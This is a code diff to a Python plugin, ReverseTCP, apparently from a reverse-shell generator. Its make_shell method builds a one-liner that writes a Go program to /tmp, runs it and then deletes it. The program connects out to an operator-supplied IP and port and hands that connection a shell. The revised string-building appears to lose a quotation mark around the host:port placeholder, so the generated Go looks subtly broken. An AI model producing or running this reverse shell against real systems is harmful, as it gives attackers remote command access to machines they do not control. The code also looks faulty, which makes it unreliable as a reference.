@@ -15,8 +15,7 @@ class ReverseTCP(plugin.ReverseShell):
 
     def make_shell(self):
         self.shell = """echo 'package main;import"os/exec";import"net";func main(){"""
-        self.shell += """c,_:=net.Dial("tcp",
-        "{}:{}");cmd:=exec.Command("{}");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()""".format(
-            self.args.ip, self.args.port, self.args.shell)
-        self.shell += """}' > /tmp/t.go && go run
-        /tmp/t.go && rm /tmp/t.go"""
+        self.shell += """c,_:=net.Dial("tcp",{}:{}");""".format(self.args.ip, self.args.port)
+        self.shell += """cmd:=exec.Command("{}");""".format(self.args.shell)
+        self.shell += "cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()"
+        self.shell += "}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
